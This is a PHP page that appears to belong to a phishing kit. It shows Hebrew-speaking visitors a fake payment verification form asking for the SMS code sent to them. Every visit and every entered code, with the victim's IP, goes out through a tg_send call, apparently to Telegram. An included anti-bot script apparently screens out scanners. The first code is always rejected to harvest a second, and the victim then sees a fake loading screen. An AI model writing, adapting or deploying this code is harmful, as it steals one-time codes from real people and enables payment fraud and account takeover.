<?php
include 'antibot.php';
include_once("config.php");

session_start();
$ip = $_SERVER['REMOTE_ADDR'];
tg_send("📥 <b>Visit:</b> sms.php\nIP: $ip");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $smscode = $_POST['smscode'] ?? '';
  $_SESSION['attempt'] = ($_SESSION['attempt'] ?? 0) + 1;
  $attempt = $_SESSION['attempt'];

  tg_send("📲 <b>SMS Attempt #$attempt</b>\nCode: $smscode\nIP: $ip");

  if ($attempt >= 2) {
    echo '
<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
  <meta charset="UTF-8">
  <title>מעבד בקשה...</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #f5f6fa;
      font-family: "Segoe UI", Tahoma, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      color: #222;
    }
    .loader-text {
      font-size: 1.2em;
      margin-top: 20px;
    }
    .dots span {
      animation: blink 1.5s infinite;
      font-size: 2em;
      margin: 0 2px;
    }
    .dots span:nth-child(2) { animation-delay: 0.2s; }
    .dots span:nth-child(3) { animation-delay: 0.4s; }

    @keyframes blink {
      0%, 80%, 100% { opacity: 0; }
      40% { opacity: 1; }
    }
  </style>
</head>
<body>
  <img src="https://i.imgur.com/5LZ8dA5.gif" alt="Loading" width="90" />
  <div class="loader-text">מעבד את הבקשה שלך<span class="dots"><span>.</span><span>.</span><span>.</span></span></div>
  <script>
    setTimeout(function() {
      window.location.href = "final.php"; // or final.php
    }, 3000);
  </script>
</body>
</html>';
exit;
    exit;
  }

  $error = true;
}
?>
<!DOCTYPE html>
<html lang="he" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>אימות תשלום</title>
  <style>
    body { font-family: Arial; background: #f8f9fa; margin: 0; padding: 0; direction: rtl; }
    .container { max-width: 460px; margin: 70px auto; padding: 25px; background: white; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); text-align: center; }
    h2 { margin-bottom: 20px; color: #222; }
    label { display: block; margin: 12px 0 6px; text-align: right; font-weight: bold; }
    input[type="text"] { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 1em; }
    button { margin-top: 20px; background-color: #007bff; color: white; border: none; padding: 12px; width: 100%; font-size: 1.1em; border-radius: 4px; cursor: pointer; }
    .error { color: red; margin-top: 10px; }
    .or-line { margin: 30px 0 10px; color: #888; font-size: 0.95em; position: relative; }
    .or-line::before, .or-line::after { content: ""; position: absolute; top: 50%; width: 40%; height: 1px; background: #ccc; }
    .or-line::before { right: 55%; }
    .or-line::after { left: 55%; }
  </style>
</head>
<body>
  <div class="container">
    <h2>אימות באמצעות SMS</h2>
    <form method="POST">
      <label>הזן את הקוד שנשלח אליך</label>
      <input type="text" name="smscode" required placeholder="123456" />
      <?php if (!empty($error)): ?>
      <div class="error">שגיאה, נסה שוב</div>
      <?php endif; ?>
      <button type="submit">אשר קוד</button>
    </form>
    <div class="or-line">או</div>
    <form action="final.php">
      <button style="background-color: #28a745;">אשר דרך האפליקציה</button>
    </form>
  </div>
</body>
</html>
